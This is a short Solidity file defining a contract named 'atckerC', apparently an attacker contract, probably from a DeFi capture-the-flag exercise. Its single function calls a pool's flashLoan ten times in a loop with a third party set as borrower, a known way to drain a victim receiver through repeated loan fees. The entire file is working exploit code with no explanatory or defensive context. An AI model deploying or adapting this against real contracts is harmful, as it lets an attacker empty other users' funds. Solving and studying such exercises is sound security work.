// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract atckerC {
    function callaAfunz(address chi, uint256 amountz, address pol) public {
        for (uint256 i = 0; i < 10; i++) {
            Itescammo(chi).flashLoan(pol, amountz);
        }
    }
}

interface Itescammo {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}
